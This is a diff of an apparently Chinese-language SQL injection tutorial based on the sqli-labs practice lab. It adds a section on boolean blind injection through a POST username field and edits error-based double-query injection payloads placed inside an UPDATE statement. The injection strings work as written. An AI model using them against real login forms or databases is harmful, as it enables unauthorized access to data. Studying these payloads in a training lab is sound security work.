@@ -739,6 +739,20 @@ Double query injection
 
 <img src="/images/sql_19.png" alt="">
 
+<h4>bool based injeciton in POST</h4>
+
+同样在Post方法里面，还有基于盲注的，例如Less15 -16。
+
+在username字段里面提交：' or (select length(database()))=8 #
+
+显示结果是：
+
+<img src="/images/sql_22.png" alt="">
+
+试试bool为false：' or (select length(database()))=7 #
+
+<img src="/images/sql_23.png" alt="">
+
 <h4>SQLi in Update query</h4>
 
 在数据库的操作中，最常用的是查询语句，但偶尔还是会用上Update语句的。
@@ -795,17 +809,15 @@ UPDATE users SET password = '' or (select length(database()))=8 #' WHERE usernam
 
 构造的注入如下：
 
-UPDATE users SET password = '' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
+UPDATE users SET password = '' or (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
 
 所以如果写成这样：
 
-UPDATE users SET password = '1' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
+UPDATE users SET password = '1' or (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
 
 那么这个语句就能正常的显示：
 
 <img src="/images/sql_21.png" alt="">
-
-
 
 <code>...待续</code>
 
